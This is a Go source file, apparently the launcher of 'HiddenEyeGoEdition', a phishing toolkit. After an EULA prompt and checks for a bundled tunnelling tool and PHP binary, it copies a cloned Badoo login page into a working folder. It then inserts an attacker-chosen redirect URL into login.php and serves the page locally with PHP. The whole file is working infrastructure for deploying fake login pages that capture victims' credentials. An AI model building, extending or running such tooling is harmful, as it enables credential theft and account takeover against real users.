package main

import (
	"HiddenEyeGoEdition/localization"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	cp "github.com/otiai10/copy"
)

func main() {
	prereqs()
	mainRunner()
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return err == nil
}

func prereqs() {
	fmt.Println(localization.TerminalClear)
	fmt.Println(localization.Title)
	fmt.Println(localization.TitleDash)
	fmt.Println()
	fmt.Println(localization.EulaApproval)
	var EulaPerms string
	fmt.Scanln(&EulaPerms)
	fmt.Println(localization.TerminalClear)

	switch EulaPerms {
	case "Y", "y":
		checkExecutables()
	case "N", "n":
		fmt.Println(localization.EulaDenied)
		os.Exit(0)
	default:
		prereqs()
	}
}

func checkExecutables() {
	boreExists := fileExists("src/bore.exe")
	phpExists := fileExists("src/php/php.exe")

	switch {
	case boreExists && phpExists:
		// Both executables exist, nothing to do here
	case !boreExists && phpExists:
		fmt.Println(localization.MissingBore)
	case boreExists && !phpExists:
		fmt.Println(localization.MissingPhp)
	case !boreExists && !phpExists:
		fmt.Println(localization.BigOopsie)
		os.Exit(0)
	}
}

func mainRunner() {
	fmt.Println(localization.Title)
	fmt.Println(localization.TitleDash)
	fmt.Println()
	fmt.Println(localization.PageList)
	fmt.Println(localization.PageChooser)
	var MainMenu string
	fmt.Scanln(&MainMenu)
	switch MainMenu {
	case "1":
		webpageCopier("badoo")
		redirectChange()
		localhost()
	}
}

func webpageCopier(webpage string) {
	if err := os.RemoveAll("workingfolder"); err != nil {
		log.Fatalf("Failed to remove directory: %v", err)
	}

	if err := os.Mkdir("workingfolder", 0755); err != nil {
		log.Fatalf("Failed to create directory: %v", err)
	}

	if err := cp.Copy("webpages/"+webpage, "workingfolder"); err != nil {
		log.Fatalf("Failed to copy files: %v", err)
	}
}

func redirectChange() {
	fmt.Println(localization.TerminalClear)
	fmt.Println(localization.Title)
	fmt.Println(localization.TitleDash)
	fmt.Println()
	fmt.Println(localization.RedirectPage)
	var redirectLink string
	fmt.Scanln(&redirectLink)
	content, err := os.ReadFile("workingfolder/login.php")
	if err != nil {
		log.Fatalf("Failed to read file: %v", err)
	}

	if !strings.Contains(string(content), "<CUSTOM>") {
		log.Println("No <CUSTOM> placeholder found in the file")
		return
	}

	modifiedContent := strings.Replace(string(content), "<CUSTOM>", redirectLink, -1)

	err = os.WriteFile("workingfolder/login.php", []byte(modifiedContent), 0644)
	if err != nil {
		log.Fatalf("Failed to write file: %v", err)
	}

}

func localhost() {
	cmd := exec.Command("src/php/php.exe", "-t", "workingfolder", "-S", "localhost:8000")

	if err := cmd.Start(); err != nil {
		log.Fatalf("Failed to start PHP server: %v", err)
	}

	fmt.Println("PHP server started at http://localhost:8000")

	if err := cmd.Wait(); err != nil {
		log.Fatalf("PHP server exited with error: %v", err)
	}
}
